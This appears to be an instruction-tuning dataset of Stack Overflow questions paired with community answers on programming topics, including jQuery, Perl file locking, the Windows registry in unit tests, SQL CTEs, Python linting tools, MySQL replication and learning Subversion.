{"instruction": "The datepicker function only works on the first input box that is created.\nI'm trying to duplicate a datepicker by cloning the div that is containing it.\n<a href=\"#\" id=\"dupMe\">click</a>\n<div id=\"template\">\ninput-text <input type=\"text\" value=\"text1\" id=\"txt\" />\ndate time picker <input type=\"text\" id=\"example\" value=\"(add date)\" />\n</div>\n\nTo initialize the datepicker, according to the jQuery UI documentation I only have to do $('#example').datepicker(); and it does work, but only on the first datepicker that is created.\nThe code to duplicate the div is the following:\n$(\"a#dupMe\").click(function(event){\n    event.preventDefault();\n    i++;\n    var a = $(\"#template\").clone(true).insertBefore(\"#template\").hide().fadeIn(1000);\n    a.find(\"input#txt\").attr('value', i);\n    a.find(\"input#example\").datepicker();\n});\n\nThe strangest thing is that on the document.ready I have:\n$('#template #example').datepicker();\n$(\"#template #txt\").click(function() { alert($(this).val()); });\n\nand if I click on the #txt it always works.", "output": "I'd recommend just using a common class name as well.  However, if you're against this for some reason, you could also write a function to create date pickers for all text boxes in your template div (to be called after each duplication). Something like:\nfunction makeDatePickers() {\n    $(\"#template input[type=text]\").datepicker();\n}"}
{"instruction": "What is the best way to create a lock on a file in Perl?\nIs it best to flock on the file or to create a lock file to place a lock on and check for a lock on the lock file?", "output": "Use the flock Luke. \nEdit: This is a good explanation."}
{"instruction": "What is the best way to create a lock on a file in Perl?\nIs it best to flock on the file or to create a lock file to place a lock on and check for a lock on the lock file?", "output": "flock creates Unix-style file locks, and is available on most OS's Perl runs on.  However flock's locks are advisory only.\nedit: emphasized that flock is portable"}
{"instruction": "What is the best way to create a lock on a file in Perl?\nIs it best to flock on the file or to create a lock file to place a lock on and check for a lock on the lock file?", "output": "If you end up using flock, here's some code to do it:\nuse Fcntl ':flock'; # Import LOCK_* constants\n\n# We will use this file path in error messages and function calls.\n# Don't type it out more than once in your code.  Use a variable.\nmy $file = '/path/to/some/file';\n\n# Open the file for appending.  Note the file path is quoted\n# in the error message.  This helps debug situations where you\n# have a stray space at the start or end of the path.\nopen(my $fh, '>>', $file) or die \"Could not open '$file' - $!\";\n\n# Get exclusive lock (will block until it does)\nflock($fh, LOCK_EX) or die \"Could not lock '$file' - $!\";\n\n# Do something with the file here...\n\n# Do NOT use flock() to unlock the file if you wrote to the\n# file in the \"do something\" section above.  This could create\n# a race condition.  The close() call below will unlock the\n# file for you, but only after writing any buffered data.\n\n# In a world of buffered i/o, some or all of your data may not \n# be written until close() completes.  Always, always, ALWAYS \n# check the return value of close() if you wrote to the file!\nclose($fh) or die \"Could not write '$file' - $!\";\n\nSome useful links:\n\nPerlMonks file locking tutorial (somewhat old)\nflock() documentation\n\nIn response to your added question, I'd say either place the lock on the file or create a file that you call 'lock' whenever the file is locked and delete it when it is no longer locked (and then make sure your programs obey those semantics)."}
{"instruction": "We have a team of about 7 engineers, whom I supervise. We do not have a formal office where we all work. Instead, a handful are located outside of our city, while the rest of us are scattered around the Bay Area.\nQuite frequently, I find myself attempting to teach concepts like TDD or refactoring to some of our more junior (or not) developers. The best technique I know is pair programming, where you both sit at the same computer and work on a problem together. Since we are not in the same place most of the time, the only option is to use some kind of screen sharing and Skype to have one of us \"drive\" while the other consults, and then switch.\nMy question is has anyone tried this \"virtual\" pair programming, and did you find it at all useful?", "output": "I've done quite a lot of pair-programming not only cross-site but cross-timezone.  I live in Israel and I work with people on the West Coast all the time.  The best way I've found is to use shared VNC session and skype.  You need some \"good behavior\" to ensure that only one of us types at a given time.  The VNC server that we use gives us two different pointers so we can move our respective mice without getting in the way, so long as we don't actually click.\nThe main problem is that the clipboard is shared, so if someone selects something it's automatically copied to the other's clipboard.\nAs a general rule, pair programming cross site, while not ideal, is certainly workable, and most definitely useful."}
{"instruction": "I am taking a class that requires Python. We will review the language in class next week, and I am a quick study on new languages, but I was wondering if there are any really great Python books I can grab while I am struggling through the basics of setting up my IDE, server environment and all those other \"gotchas\" that come with a new programming language. Suggestions?", "output": "Many people have suggested Dive Into Python, which is probably the best Python book out there for someone who's already a good programmer.  However, if you're new to programming, the best book is probably \"How to Think Like a Computer Scientist: Learning With Python\" (http://openbookproject.net/thinkCSpy/index.xhtml)"}
{"instruction": "Has anyone looked at Yahoo's ASTRA? It's fairly nifty, but I had some issues creating a custom label for a pie chart. They have an example for a line chart, which overrides an axis's series's label renderer.  My solution was to override the myPieChart.dataTipFunction. For data that looks like:\nmyPieChart.dataProvider =\n  [ { category: \"Groceries\", cost: 50 },\n    { category: \"Transportation\", cost: 175} ]\nmyPieChart.dataField = \"cost\";\nmyPieChart.categoryField = \"category\";\n\nI wrote a function like this:\nimport com.yahoo.astra.fl.charts.series.*\nmyPieChart.dataTipFunction = \n  function (obj:Object, index:int, series:ISeries):String {\n    return obj.category + \"\\n$\" + obj.cost;\n  };\n\nThere's ceil(2.718281828459045) problems with this:\n\nI'm directly calling the category and cost properties of the data provider. The names are actually configurable when setting up the chart, I'd like to maintain that flexibility.\nThe default data tip would show the category, the cost (without a dollar sign), and the percentage it makes up in the pie chart. So here, I've lost the percentage. I just have no idea which property of what would hold that. It might be part of the series.\nI probably only need to override the dataItemRenderer for the cost part of the series, but I don't know how to access it.  The documentation is a little ... lacking there.\n\nNormally I would just look at the default implementation of the dataTipFunction but it's all inside a compiled shm that's part of the components distributed from yahoo.\nCan anyone help me complete this overridden function with percentage information and the flexibility mentioned in point 1?", "output": "Okay... so no-one's tried Astra, or people just avoid Flash questions.\nAfter a lot of guess work it turns out I needed to cast the series to a PieSeries and then work with those member functions, as the ISeries was useless on it's own.\nmyPieChart.dataTipFunction = \n  function (item:Object, index:int, series:ISeries):String {\n    var oPieSeries:PieSeries = series as PieSeries;\n    return oPieSeries.itemToCategory(item,index) + \"\\n$\" + \n           oPieSeries.itemToData(item) + \"\\n\" + \n           Number(oPieSeries.itemToPercentage(item)).toFixed(2) + \"%\";\n  };"}
{"instruction": "After the suggestion to use a library for my ajax needs I am going to use one, the problem is that there are so many and I've no idea how to even begin telling them apart.\nThus, can anybody \nA) Give a rundown of the differences or \nB) Point me (and others like me) somewhere that has such a list. \nFailing that plan C is to go with whichever gets mentioned the most here.", "output": "To answer B:\nComparison of JavaScript frameworks\n\nEDIT: Although everyone and their mom is apparently riding the jQuery bandwagon (I use MochiKit), there are many libraries which provide the same functionality - the problem set which most libraries solve (async client-server communication, DOM manipulation, etc.) is the same, and there are few that don't have what you will need to get the job done. \nThe important thing to determine for yourself is whether or not a library will fit your particular style and sensibilities. Wide-spread ignorance about how JavaScript, the language, actually works, coupled with the negative press resulting thereby, coupled with the now-immense popularity of jQuery leads most people down that road. Thankfully, it isn't a bad road to be on as there are a lot of travellers to keep you company when the abstractions leak and you need help. You probably can't go wrong choosing jQuery."}
{"instruction": "After the suggestion to use a library for my ajax needs I am going to use one, the problem is that there are so many and I've no idea how to even begin telling them apart.\nThus, can anybody \nA) Give a rundown of the differences or \nB) Point me (and others like me) somewhere that has such a list. \nFailing that plan C is to go with whichever gets mentioned the most here.", "output": "Stackoverflow uses jquery I think, and I hear that jquery is all the rage"}
{"instruction": "After the suggestion to use a library for my ajax needs I am going to use one, the problem is that there are so many and I've no idea how to even begin telling them apart.\nThus, can anybody \nA) Give a rundown of the differences or \nB) Point me (and others like me) somewhere that has such a list. \nFailing that plan C is to go with whichever gets mentioned the most here.", "output": "We are starting to use jQuery where I work. I'm not big on JavaScript, but everyone else likes it a lot. I don't know if that helps at all..."}
{"instruction": "After the suggestion to use a library for my ajax needs I am going to use one, the problem is that there are so many and I've no idea how to even begin telling them apart.\nThus, can anybody \nA) Give a rundown of the differences or \nB) Point me (and others like me) somewhere that has such a list. \nFailing that plan C is to go with whichever gets mentioned the most here.", "output": "jQuery, easy to learn, easy to use, small footprint, active plugin developer community.  Can't go wrong with jQuery."}
{"instruction": "After the suggestion to use a library for my ajax needs I am going to use one, the problem is that there are so many and I've no idea how to even begin telling them apart.\nThus, can anybody \nA) Give a rundown of the differences or \nB) Point me (and others like me) somewhere that has such a list. \nFailing that plan C is to go with whichever gets mentioned the most here.", "output": "For what its worth jQuery's website redesign launched this morning (Friday August 29, 2008).  Good fun fact.  And of course +1 to its mention."}
{"instruction": "After the suggestion to use a library for my ajax needs I am going to use one, the problem is that there are so many and I've no idea how to even begin telling them apart.\nThus, can anybody \nA) Give a rundown of the differences or \nB) Point me (and others like me) somewhere that has such a list. \nFailing that plan C is to go with whichever gets mentioned the most here.", "output": "I've been using Prototype + Scriptaculous.  \nThey have good API documentation and work great for me!  The biggest benefits are:\n\nCleans up messy javascript code\nCross browser compatibility\nSimplifies AJAX handling\nSmooth UI effects"}
{"instruction": "What's the best way to programmatically merge a .reg file into the registry? This is for unit testing; the .reg file is a test artifact which will be added then removed at the start and end of testing.\nOr, if there's a better way to unit test against the registry...", "output": "I looked into it by checking out my file associations.\nIt seems that a .reg file is just called as the first parameter to the regedit.exe executable on Windows. \nSo you can just say regedit.exe \"mytest.reg\". What I'm not sure of is how to get rid of the dialog box that pops up that asks for your confirmation."}
{"instruction": "What's the best way to programmatically merge a .reg file into the registry? This is for unit testing; the .reg file is a test artifact which will be added then removed at the start and end of testing.\nOr, if there's a better way to unit test against the registry...", "output": "Use the Win32 API function ShellExecute() or ShellExecuteEx(). If the comment is 'open' it should merge the .reg file. I haven't tested it, but it should work."}
{"instruction": "After the suggestion to use a library for my ajax needs I am going to use one, the problem is that there are so many and I've no idea how to even begin telling them apart.\nThus, can anybody \nA) Give a rundown of the differences or \nB) Point me (and others like me) somewhere that has such a list. \nFailing that plan C is to go with whichever gets mentioned the most here.", "output": "I have to put in another vote for jQuery. It is dead-simple to use and makes your javascript much cleaner.\nAs an example, if you want to add an onclick event to all the divs inside an element with id \"clickdivs\", you just do this:\nfunction clickedme(event) {\n  alert('Someone clicked me!');\n}\n$('#clickdivs div').click(clickedme);\n\nYour HTML would look like this:\n<div id=\"clickdivs\">\n  <div>Click Here</div>\n  <div>And Here</div>\n  <p>Not here</p>\n  <div>Click Here Too</div>\n</div>\n\nViola!"}
{"instruction": "After the suggestion to use a library for my ajax needs I am going to use one, the problem is that there are so many and I've no idea how to even begin telling them apart.\nThus, can anybody \nA) Give a rundown of the differences or \nB) Point me (and others like me) somewhere that has such a list. \nFailing that plan C is to go with whichever gets mentioned the most here.", "output": "Related thread here, with some good contributions:\nWhat JavaScript library would you choose for a new project and why?"}
{"instruction": "What's the best way to programmatically merge a .reg file into the registry? This is for unit testing; the .reg file is a test artifact which will be added then removed at the start and end of testing.\nOr, if there's a better way to unit test against the registry...", "output": "yeah, thought of both of those.... but then how do you remove the entries? I don't think regedit command line provides that functionality.\nI think I'm going to go with the approach of just adding the keys via the usual registry API's, then remove them the same way.\nUnless some better way comes along."}
{"instruction": "Is it possible to do image processing in silverlight 2.0?\nWhat I want to do is take an image, crop it, and then send the new cropped image up to the server.  I know I can fake it by clipping the image, but that only effects the rendering of the image.  I want to create a new image.\nAfter further research I have answered my own question. Answer: No.  Since all apis would be in System.Windows.Media.Imaging and that namespace does not have the appropriate classes in Silverlight\nI'm going to use fjcore.  http://code.google.com/p/fjcore/\nThanks Jonas", "output": "I know this doesn't directly answer your question, but what if you do all of the clipping on the client side to crop the image, then send the server the original image and the coordinates for clipping. Then on the server side, which will probably more suited for image manipulation like this (e.g. PHP it's very easy) you'll do the actual cropping of the image and storing the cropped version."}
{"instruction": "What's the best way to programmatically merge a .reg file into the registry? This is for unit testing; the .reg file is a test artifact which will be added then removed at the start and end of testing.\nOr, if there's a better way to unit test against the registry...", "output": "It is possible to remove registry keys using a .reg file, although I'm not sure how well it's documented.  Here's how:\nREGEDIT4\n\n[-HKEY_CURRENT_USER\\Software\\<otherpath>]\n\nThe - in front of the key name tells Regedit that you want to remove the key.\nTo run this silently, type:\nregedit /s \"myfile.reg\""}
{"instruction": "How is your javaScript code organized? Does it follow patterns like MVC, or something else? \nI've been working on a side project for some time now, and the further I get, the more my webpage has turned into a full-featured application. Right now, I'm sticking with jQuery, however, the logic on the page is growing to a point where some organization, or dare I say it, \"architecture\" is needed. My first approach is \"MVC-ish\":\n\nThe 'model' is a JSON tree that gets extended with helpers\nThe view is the DOM plus classes that tweak it\nThe controller is the object where I connect events handling and kick off view or model manipulation\n\nI'm very interested, however, in how other people have built more substantial javaScript apps. I'm not interested in GWT, or other server-oriented approaches... just in the approach of \"javaScript + <generic web service-y thingy here>\"\nNote: earlier I said javaScript \"is not really OO, not really functional\". This, I think, distracted everyone. Let's put it this way, because javaScript is unique in many ways, and I'm coming from a strongly-typed background, I don't want to force paradigms I know but were developed in very different languages.", "output": "MochiKit is great -- and was my first love, so-to-speak, as far as js libraries go.  But I found that while MochiKit has very expressive syntax, it didn't feel nearly as comfortable to me as Prototype/Scriptaculous or jQuery did for me.\nI think if you know or like python, then MochiKit is a good tool for you."}
{"instruction": "What does it mean if a task is declared with the automatic keyword in Verilog?\ntask automatic do_things;\n  input [31:0] number_of_things;\n  reg [31:0] tmp_thing;\n  begin\n    // ...\n  end\nendtask;\n\nNote: This question is mostly because I'm curious if there are any hardware programmers on the site. :)", "output": "It means that the task is re-entrant - items declared within the task are dynamically allocated rather than shared between different invocations of the task.\nYou see - some of us do Verilog...  (ugh)"}
{"instruction": "So I want to get a project on a distributed version control system, such as mercurial, git, or bazaar.  The catch is that I need the Windows support to be good, i.e. no instructions that start off with \"install cygwin...\".  Now I've heard that git's Windows support is decent these days, but don't have any first hand experience.  Also, it sounds like the bazaar team has an explicit goal of making it as multiplatform as possible.\r\nCan I get any recommendations?", "output": "I've had the best luck with Bazaar, followed by Mercurial. Never could get Git to work correctly. A quick search shows that Git still requires clunky emulation layers like Cygwin/MSYS, and I can't find any integration tools like TortoiseBzr for Git.\nWith Mercurial in Windows, I had several minor issues (insensitive paths, symlinks, ). They were usually fixed eventually, but I felt that the same quality of testing was not applied to running on Windows as for the other platforms. Bazaar also had better documentation for integrating with native applications like Visual C."}
{"instruction": "I am taking a class that requires Python. We will review the language in class next week, and I am a quick study on new languages, but I was wondering if there are any really great Python books I can grab while I am struggling through the basics of setting up my IDE, server environment and all those other \"gotchas\" that come with a new programming language. Suggestions?", "output": "I'll second Daniel's recommendation of Python in a Nutshell. If you're quick to pick up new languages, it's probably exactly what you're looking for. There's a nice overview of how the language works, and then a discussion of most of the standard library. It's concise and clear, and doesn't assume that you don't know basic programming things already."}
{"instruction": "I've written a stored proc that will do an update if a record exists, otherwise it will do an insert. It looks something like this:\nupdate myTable set Col1=@col1, Col2=@col2 where ID=@ID\nif @@rowcount = 0\ninsert into myTable (Col1, Col2) values (@col1, @col2)\n\nMy logic behind writing it in this way is that the update will perform an implicit select using the where clause and if that returns 0 then the insert will take place.\nThe alternative to doing it this way would be to do a select and then based on the number of rows returned either do an update or insert. This I considered inefficient because if you are to do an update it will cause 2 selects (the first explicit select call and the second implicit in the where of the update). If the proc were to do an insert then there'd be no difference in efficiency.\nIs my logic sound here?\nIs this how you would combine an insert and update into a stored proc?", "output": "Big fan of the UPSERT, really cuts down on the code to manage.  Here is another way I do it:  One of the input parameters is ID, if the ID is NULL or 0, you know it's an INSERT, otherwise it's an update.  Assumes the application knows if there is an ID, so wont work in all situations, but will cut the executes in half if you do."}
{"instruction": "The company I'm currently working for is using Selenium for Uniting-Testing our User Interface. What do you use to Unit-Test your Web UI and how effective do you find it?", "output": "Check out Canoo Web Test.  It is open source and built on the ANT framework.\nI spent some time working with it for a graduate course on Software QA and it seems to be a pretty powerful testing tool."}
{"instruction": "I am taking a class that requires Python. We will review the language in class next week, and I am a quick study on new languages, but I was wondering if there are any really great Python books I can grab while I am struggling through the basics of setting up my IDE, server environment and all those other \"gotchas\" that come with a new programming language. Suggestions?", "output": "I think that Think Python is very good for first-time programmers. Pleasant writing style too.."}
{"instruction": "In the code below I am using a recursive CTE(Common Table Expression) in SQL Server 2005 to try and find the top level parent of a basic hierarchical structure. The rule of this hierarchy is that every CustID has a ParentID and if the CustID has no parent then the ParentID = CustID and it is the highest level.\nDECLARE @LookupID int\n\n--Our test value\nSET @LookupID = 1\n\nWITH cteLevelOne (ParentID, CustID) AS\n(\n    \tSELECT   a.ParentID, a.CustID\n    \tFROM     tblCustomer AS a\n    \tWHERE    a.CustID = @LookupID\n    UNION ALL\n    \tSELECT   a.ParentID, a.CustID\n    \tFROM     tblCustomer AS a\n    \tINNER JOIN cteLevelOne AS c ON a.CustID = c.ParentID\n    \tWHERE c.CustID <> a.CustomerID\n)\n\nSo if tblCustomer looks like this:  \nParentID    CustID\n5            5\n1            8\n5            4\n4            1\n\nThe result I get from the code above is:  \nParentID    CustID\n4            1\n5            4\n5            5\n\nWhat I want is just the last row of that result:  \nParentID    CustID\n5            5\n\nHow do I just return the last record generated in the CTE (which would be highest level CustID)?\nAlso note that there are multiple unrelated CustID hierarchies in this table so I can't just do a SELECT * FROM tblCustomer WHERE ParentID = CustID. I can't order by ParentID or CustID because the ID number is not related to where it is in the hierarchy.", "output": "I'm not certain I fully understand the problem, but just to hack & slash at it you could try:\nSELECT TOP 1 FROM cteLevelOne ORDER BY CustID DESC\n\nThat assumes that the CustID is also in order as in the example, and not something like a GUID."}
{"instruction": "I am taking a class that requires Python. We will review the language in class next week, and I am a quick study on new languages, but I was wondering if there are any really great Python books I can grab while I am struggling through the basics of setting up my IDE, server environment and all those other \"gotchas\" that come with a new programming language. Suggestions?", "output": "I learned most of my initial pythonese from this super-handy quick reference:\nhttp://rgruet.free.fr/PQR2.3.html"}
{"instruction": "I am taking a class that requires Python. We will review the language in class next week, and I am a quick study on new languages, but I was wondering if there are any really great Python books I can grab while I am struggling through the basics of setting up my IDE, server environment and all those other \"gotchas\" that come with a new programming language. Suggestions?", "output": "I tried learning from Programming Python and I didn't like it. I'm going to give Python in a Nutshell a try as per suggestions below."}
{"instruction": "I've had a tough time setting up my replication server. Is there any program (OS X, Win, Linux or php no problem) that lets me monitor and resolve replication issues? (btw, for those -uhm- following, ive been on this issue here, here, here and here. Either i'm going about this the wrong way or i must be immensely thick)\nMy production database is several megs in size and growing. Every time the database replication stops and the databases inevitably begin to slide out of sync i cringe. My last resync from dump took almost 4 hours roundtrip!\nAs always, even after sync, I run into this kind of show-stopping error\":\nError 'Duplicate entry '252440' for key 1' on query.\n\nI would love it if there was some way to closely monitor whats going on and perhaps let the software deal with it. I'm even all ears for service companies which may help me monitor my data better. Or an alternate way to mirror altogether.\nEdit: going through my previous questions i found this which helps tremendously. I'm still all ears on the monitoring solution.\ncheers,\n/mp", "output": "To monitor the servers we use the free tools from Maatkit ... simple, yet efficient.\nThe binary replication is available in 5.1, so I guess you've got some balls. We still use 5.0 and it works OK, but of course we had our share of issues with it.\nWe use a Master-Master replication with a MySql Proxy as a load-balancer in front, and to prevent it from having errors:\n\nwe removed all unique indexes\nfor the few cases where we really needed unique constraints we made sure we used REPLACE instead of INSERT (MySql Proxy can be used to guard for proper usage ... it can even rewrite your queries)\nscheduled scripts doing intensive reports are always accessing the same server (not the load-balancer) ... so that dangerous operations are replicated safely\n\nYeah, I know it sounds simple and stupid, but it solved 95% of all the problems we had."}
{"instruction": "I am starting to use Python (specifically because of Django) and I would like to remove the burden for exhaustive testing by performing some static analysis.  What tools/parameters/etc. exist to detect issues at compile time that would otherwise show up during runtime? (type errors are probably the most obvious case of this, but undefined variables are another big one that could be avoided with an in-depth analysis of the AST.)\nObviously testing is important, and I don't imply that tests can be obviated entirely; however, there are many runtime errors in python that are not possible in other languages that perform stricter run-time checking -- I'm hoping that there are tools to bring at least some of these capabilities to python as well.", "output": "There's\n\npylint\npychecker\npyflakes\n\nAnd probably others, too."}
{"instruction": "I am starting to use Python (specifically because of Django) and I would like to remove the burden for exhaustive testing by performing some static analysis.  What tools/parameters/etc. exist to detect issues at compile time that would otherwise show up during runtime? (type errors are probably the most obvious case of this, but undefined variables are another big one that could be avoided with an in-depth analysis of the AST.)\nObviously testing is important, and I don't imply that tests can be obviated entirely; however, there are many runtime errors in python that are not possible in other languages that perform stricter run-time checking -- I'm hoping that there are tools to bring at least some of these capabilities to python as well.", "output": "pylint is the best such tool I've found. Due to Python's nature it's difficult to statically analyze it, but it will catch undefined variables, basic type errors, unused code, etc. You'll want to tweak the configuration file, as by default it outputs many warnings I consider useless or harmful.\nHere's part of my .pylintrc dealing with warning silencing:\n[MESSAGES CONTROL]\n\n# Brain-dead errors regarding standard language features\n#   W0142 = *args and **kwargs support\n#   W0403 = Relative imports\n\n# Pointless whinging\n#   R0201 = Method could be a function\n#   W0212 = Accessing protected attribute of client class\n#   W0613 = Unused argument\n#   W0232 = Class has no __init__ method\n#   R0903 = Too few public methods\n#   C0301 = Line too long\n#   R0913 = Too many arguments\n#   C0103 = Invalid name\n#   R0914 = Too many local variables\n\n# PyLint's module importation is unreliable\n#   F0401 = Unable to import module\n#   W0402 = Uses of a deprecated module\n\n# Already an error when wildcard imports are used\n#   W0614 = Unused import from wildcard\n\n# Sometimes disabled depending on how bad a module is\n#   C0111 = Missing docstring\n\n# Disable the message(s) with the given id(s).\ndisable=W0142,W0403,R0201,W0212,W0613,W0232,R0903,W0614,C0111,C0301,R0913,C0103,F0401,W0402,R0914"}
{"instruction": "I am starting to use Python (specifically because of Django) and I would like to remove the burden for exhaustive testing by performing some static analysis.  What tools/parameters/etc. exist to detect issues at compile time that would otherwise show up during runtime? (type errors are probably the most obvious case of this, but undefined variables are another big one that could be avoided with an in-depth analysis of the AST.)\nObviously testing is important, and I don't imply that tests can be obviated entirely; however, there are many runtime errors in python that are not possible in other languages that perform stricter run-time checking -- I'm hoping that there are tools to bring at least some of these capabilities to python as well.", "output": "You should check out Pyflakes, Pylint, and PyChecker. I've personally used both Pyflakes and Pylint, and found them both to be very helpful for catching those little things you hate to mess up on. Pylint generally requires a bit more configuration than Pyflakes.\nAlso noteworthy: Eclipse's PyDev plugin comes in with a built in Pylint output parser."}
{"instruction": "I'm currently working on a large implementation of Class::DBI for an existing database structure, and am running into a problem with clearing the cache from Class::DBI.  This is a mod_perl implementation, so an instance of a class can be quite old between times that it is accessed.\nFrom the man pages I found two options:\nMusic::DBI->clear_object_index();\n\nAnd:\nMusic::Artist->purge_object_index_every(2000);\n\nNow, when I add clear_object_index() to the DESTROY method, it seems to run, but doesn't actually empty the cache.  I am able to manually change the database, re-run the request, and it is still the old version.\npurge_object_index_every says that it clears the index every n requests.  Setting this to \"1\" or \"0\", seems to clear the index... sometimes.  I'd expect one of those two to work, but for some reason it doesn't do it every time.  More like 1 in 5 times.\nAny suggestions for clearing this out?", "output": "The \"common problems\" page on the Class::DBI wiki has a section on this subject.  The simplest solution is to disable the live object index entirely using:\n$Class::DBI::Weaken_Is_Available = 0;"}
{"instruction": "Graphics and audio editing and processing software often contain functions called \"High-Pass Filter\" and \"Low-Pass Filter\".  Exactly what do these do, and what are the algorithms for implementing them?", "output": "Wikipedia:\n\nHigh-pass filter\nLow-pass filter\nBand-pass filter\n\nThese \"high\", \"low\", and \"band\" terms refer to frequencies. In high-pass, you try to remove low frequencies. In low-pass, you try to remove high. In band pass, you only allow a continuous frequency range to remain.\nChoosing the cut-off frequency depends upon your application. Coding these filters can either be done by simulating RC circuits or by playing around with Fourier transforms of your time-based data. See the wikipedia articles for code examples."}
{"instruction": "Graphics and audio editing and processing software often contain functions called \"High-Pass Filter\" and \"Low-Pass Filter\".  Exactly what do these do, and what are the algorithms for implementing them?", "output": "They are generally Electrical circuits that tend to pass parts of analog signals. High pass tends to transmit more of the high frequency parts and low pass tends to pass more of the low frequency parts.\nThey can be simulated in software. A walking average can act as a low pass filter for instance and the difference between a walking average and it's input can work as a high pass filter."}
{"instruction": "In the code below I am using a recursive CTE(Common Table Expression) in SQL Server 2005 to try and find the top level parent of a basic hierarchical structure. The rule of this hierarchy is that every CustID has a ParentID and if the CustID has no parent then the ParentID = CustID and it is the highest level.\nDECLARE @LookupID int\n\n--Our test value\nSET @LookupID = 1\n\nWITH cteLevelOne (ParentID, CustID) AS\n(\n    \tSELECT   a.ParentID, a.CustID\n    \tFROM     tblCustomer AS a\n    \tWHERE    a.CustID = @LookupID\n    UNION ALL\n    \tSELECT   a.ParentID, a.CustID\n    \tFROM     tblCustomer AS a\n    \tINNER JOIN cteLevelOne AS c ON a.CustID = c.ParentID\n    \tWHERE c.CustID <> a.CustomerID\n)\n\nSo if tblCustomer looks like this:  \nParentID    CustID\n5            5\n1            8\n5            4\n4            1\n\nThe result I get from the code above is:  \nParentID    CustID\n4            1\n5            4\n5            5\n\nWhat I want is just the last row of that result:  \nParentID    CustID\n5            5\n\nHow do I just return the last record generated in the CTE (which would be highest level CustID)?\nAlso note that there are multiple unrelated CustID hierarchies in this table so I can't just do a SELECT * FROM tblCustomer WHERE ParentID = CustID. I can't order by ParentID or CustID because the ID number is not related to where it is in the hierarchy.", "output": "If you just want want the highest recursion depth couldn't you do something like this?Then, when you actually query the CTE just look for the row with max(Depth)?  Like so:\nDECLARE @LookupID int\n\n--Our test value\nSET @LookupID = 1;\n\nWITH cteLevelOne (ParentID, CustID, Depth) AS\n(\n        SELECT   a.ParentID, a.CustID, 1\n        FROM     tblCustomer AS a\n        WHERE    a.CustID = @LookupID\n    UNION ALL\n        SELECT   a.ParentID, a.CustID, c.Depth + 1\n        FROM     tblCustomer AS a\n        INNER JOIN cteLevelOne AS c ON a.CustID = c.ParentID \n        WHERE c.CustID <> a.CustID\n)\nselect * from CTELevelone where Depth = (select max(Depth) from CTELevelone)\n\nor, adapting what trevor suggests, this could be used with the same CTE:  \nselect top 1 * from CTELevelone order by Depth desc\n\nI don't think CustomerID was necessarily what you wanted to order by in the case you described, but I wasn't perfectly clear on the question either."}
{"instruction": "I am starting to use Python (specifically because of Django) and I would like to remove the burden for exhaustive testing by performing some static analysis.  What tools/parameters/etc. exist to detect issues at compile time that would otherwise show up during runtime? (type errors are probably the most obvious case of this, but undefined variables are another big one that could be avoided with an in-depth analysis of the AST.)\nObviously testing is important, and I don't imply that tests can be obviated entirely; however, there are many runtime errors in python that are not possible in other languages that perform stricter run-time checking -- I'm hoping that there are tools to bring at least some of these capabilities to python as well.", "output": "I echo the other answers and would just add that pychecker is the quickest and easiest to use and pylint the most comprehensive and configurable.\nI also use epydoc a fair bit and this is good for pointing out problems with your docstrings."}
{"instruction": "I am ready to start using SVN, but I have NO (as in the money required for free beer) experience with source control.  I have installed subversion on my server (that was easy, 'apt-get install subversion') but now I don't know what to do, how to configure it, or how to use it.What suggestions do you have, and where can I find good resources to learn to start using it?\nUpdate:\nO.K. So the feedback has been great and I have read through a bit of it but I want to clarify my question by saying that I am looking for more information on how to actually go about setting my up my repositories, clients, server, etc.  I know that I could do a quick Google search and find dozens (or more) resources but I'm hoping that someone whom has experience with subversion and a client(I have installed tortoise) could suggest a good reference that will be reliable, and have quality content.", "output": "Eric Sink has an excellent series on source code control aimed at beginners. For Subversion specifics, including setting up and administering a server, the Subversion book is a great resource, and includes a section with examples of a typical session with Subversion (checkout, commit, merging and updating basics).\nUpdate: I forgot to mention that for beginners, I'd also recommend messing around in a graphical client, which removes the command-line hassle from the learning experience. RapidSVN is a reasonable cross-platform client. You'll also find that common IDEs either come with Subversion support, or have plugins which can be installed, which allow most version control operations to be performed within that environment.\n@John Millikin: While setting up a Subversion server can be complicated, depending on one's general admin experience, don't forget that you don't need to do that just to mess about with a repository and get to grips with the basics - the client can interact with a repository in the local filesystem."}
{"instruction": "I am ready to start using SVN, but I have NO (as in the money required for free beer) experience with source control.  I have installed subversion on my server (that was easy, 'apt-get install subversion') but now I don't know what to do, how to configure it, or how to use it.What suggestions do you have, and where can I find good resources to learn to start using it?\nUpdate:\nO.K. So the feedback has been great and I have read through a bit of it but I want to clarify my question by saying that I am looking for more information on how to actually go about setting my up my repositories, clients, server, etc.  I know that I could do a quick Google search and find dozens (or more) resources but I'm hoping that someone whom has experience with subversion and a client(I have installed tortoise) could suggest a good reference that will be reliable, and have quality content.", "output": "Where do you live that you can get free bear!?\nSubversion is complicated to set up -- if you have no experience with version control at all, I'd recommend using a distributed VCS because they don't require any server configuration. Bazaar in five minutes is a good start.\nFor Subversion, you'll want to set up either svnserve or the mod_dav_svn Apache module. I prefer the Apache module, because it gives you basic web-based repository browsing in the bargain. You'll also need to create and configure a repository -- see the SVN red book Chapter 5 for more information on repository administration. Then read chapter 2 to learn how to use Subversion itself."}
{"instruction": "I am ready to start using SVN, but I have NO (as in the money required for free beer) experience with source control.  I have installed subversion on my server (that was easy, 'apt-get install subversion') but now I don't know what to do, how to configure it, or how to use it.What suggestions do you have, and where can I find good resources to learn to start using it?\nUpdate:\nO.K. So the feedback has been great and I have read through a bit of it but I want to clarify my question by saying that I am looking for more information on how to actually go about setting my up my repositories, clients, server, etc.  I know that I could do a quick Google search and find dozens (or more) resources but I'm hoping that someone whom has experience with subversion and a client(I have installed tortoise) could suggest a good reference that will be reliable, and have quality content.", "output": "http://blog.clickablebliss.com/2006/04/26/introduction-to-subversion-screencast/ explains how to use SVN very well."}
{"instruction": "I am ready to start using SVN, but I have NO (as in the money required for free beer) experience with source control.  I have installed subversion on my server (that was easy, 'apt-get install subversion') but now I don't know what to do, how to configure it, or how to use it.What suggestions do you have, and where can I find good resources to learn to start using it?\nUpdate:\nO.K. So the feedback has been great and I have read through a bit of it but I want to clarify my question by saying that I am looking for more information on how to actually go about setting my up my repositories, clients, server, etc.  I know that I could do a quick Google search and find dozens (or more) resources but I'm hoping that someone whom has experience with subversion and a client(I have installed tortoise) could suggest a good reference that will be reliable, and have quality content.", "output": "Another good Subversion book is Pragmatic Version Control with Subversion, a Pragmatic Programmer book that goes out of its way to make key concepts of version control (from checkin & checkout to branching & merging) clear."}
